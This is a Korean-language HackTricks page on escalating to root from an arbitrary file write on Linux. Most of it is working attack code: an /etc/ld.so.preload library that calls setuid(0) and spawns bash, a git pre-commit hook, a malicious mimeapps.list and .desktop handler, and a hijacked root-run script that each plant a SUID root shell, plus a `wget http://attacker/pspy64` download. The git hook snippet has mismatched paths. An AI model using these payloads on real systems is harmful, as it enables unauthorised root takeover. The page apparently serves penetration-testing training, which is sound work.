# 루트에 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** 환경 변수처럼 동작하지만 **SUID binaries**에서도 작동합니다.\
만약 이 파일을 생성하거나 수정할 수 있다면, 실행되는 모든 바이너리에 로드될 **라이브러리의 경로**를 추가하면 됩니다.

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 git 리포지토리에서 commit이 생성되거나 merge 같은 다양한 이벤트에서 **scripts**가 **run**되는 기능입니다. 따라서 **privileged script or user**가 이러한 작업을 자주 수행하고 `.git` 폴더에 쓸 수 있다면, 이는 **privesc**에 이용될 수 있습니다.

예를 들어, git repo의 **`.git/hooks`**에 **script**를 생성하면 새 commit이 생성될 때마다 항상 실행되도록 할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

`/proc/sys/fs/binfmt_misc`에 있는 파일은 어떤 바이너리가 어떤 유형의 파일을 실행해야 하는지를 나타냅니다. TODO: 일반적인 파일 형식이 열려 있을 때 이를 악용해 rev shell을 실행하기 위한 조건을 확인하세요.

### Overwrite schema handlers (like http: or https:)

쓰기 권한이 있는 공격자는 피해자의 구성 디렉터리에 파일을 교체하거나 생성해 시스템 동작을 변경하고 원치 않는 코드 실행을 유발할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL 핸들러를 악성 파일로 지정하면(예: `x-scheme-handler/http=evil.desktop`로 설정) **http 또는 https 링크를 클릭하면 해당 `evil.desktop` 파일에 지정된 코드가 실행됩니다**. 예를 들어, `$HOME/.local/share/applications`에 있는 `evil.desktop`에 다음과 같은 악성 코드를 배치하면 외부 URL을 클릭할 때 포함된 명령이 실행됩니다:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root가 실행하는 user-writable scripts/binaries

권한 있는 워크플로우가 `/bin/sh /home/username/.../script` (또는 비권한 사용자 소유 디렉터리 내부의 any binary)을 실행하면, you can hijack it:

- **실행 감지:** root가 사용자 제어 경로를 호출하는 것을 포착하기 위해 [pspy](https://github.com/DominicBreuker/pspy)로 프로세스를 모니터링하세요:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 대상 파일과 해당 디렉터리가 모두 당신의 사용자로 소유되어 있고 쓰기 가능한지 확인하세요.
- **Hijack the target:** 원본 binary/script를 백업하고 SUID shell(또는 다른 root action)을 생성하는 payload를 심은 다음 권한을 복원하세요:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **권한 있는 동작을 트리거하세요** (예: UI 버튼을 눌러 helper를 생성). 루트가 하이재킹된 경로를 다시 실행하면 `./rootshell -p`로 상승된 쉘을 획득하세요.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
